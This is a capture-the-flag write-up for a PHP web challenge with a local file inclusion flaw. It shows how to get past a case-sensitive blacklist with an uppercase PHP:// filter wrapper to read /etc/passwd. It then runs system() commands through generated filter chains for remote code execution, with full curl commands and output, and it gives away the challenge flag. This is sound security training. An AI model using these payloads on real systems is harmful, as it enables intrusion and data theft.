# Police Leakage

## Description

We made our website dynamic now, You can easily navigate between pages!

## Solution

![Police Leakage.png](/assets/ctf/idex.ctf.ae/2025/web/Police Leakage.png)

Navigation happens with `/?page=report.php`.

To view source use `/?src`
```php
<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);

$file = isset($_GET['page']) ? $_GET['page'] : 'index.php';

if ($file) {
    $real_path = realpath($file);
    if (str_contains($real_path, "/etc") || str_contains($file, "php:") || str_contains($file,"flag")) {
        die("not allowed");
    }
}

if (isset($_GET['src'])) { highlight_file(__FILE__); }
?>
...
<div class="col-md-8">
	<?php
	include_once($file);
	?>
...
```

We have LFI, but with few restrictions being `/etc`, `php:` and `flag` in filename.

`/proc/self/cmdline` returns `php-fpm: pool www`

If flag is located at `/flag.txt` we can't read it because of blacklist.

Blacklist for `php` is not case sensitive so it can be easily bypassed, `/etc` can be included with `php` filters like:
```bash
└─$ curl 'https://cc21bcb5d34551a78c9a129b60170b21.chal.ctf.ae/?page=PHP://filter/read=string.tolower/resource=file:///etc/passwd' -so- | grep '<div class="col-md-8">' -A10000 | grep '</div' -m1 -B10000
                <div class="col-md-8">
                    root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:mailing list manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
nginx:x:101:101:nginx user:/nonexistent:/bin/false
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd network management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd time synchronization:/:/usr/sbin/nologin
                </div>
```

[https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)

[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) can be used to chain filters for RCE

```bash
└─$ curl 'https://cc21bcb5d34551a78c9a129b60170b21.chal.ctf.ae/' --get --data-urlencode "page="$(py php_filter_chain_generator.py --chain '<?php system("ls"); ?>' | sed -n '2s/php/PHP/pg') -so- | grep '<div class="col-md-8">' -aA10000 | grep '</div' -m1 -aB10000
                <div class="col-md-8">
                    50x.html
bg.png
flag.php
index.html
index.php
news.php
report.php
B0>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@                </div>
└─$ curl 'https://cc21bcb5d34551a78c9a129b60170b21.chal.ctf.ae/' --get --data-urlencode "page="$(py php_filter_chain_generator.py --chain '<?php system("cat flag.php"); ?>' | sed -n '2s/php/PHP/pg') -so- | grep '<div class="col-md-8">' -aA10000 | grep '</div' -m1 -aB10000
                <div class="col-md-8">
                    <?php echo 'flag{wZRcjUrOyovQBuEHdYPDqKUKcfYCfrtD}';?>

P>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@C>==@                </div>
```

> Flag: `flag{wZRcjUrOyovQBuEHdYPDqKUKcfYCfrtD}`

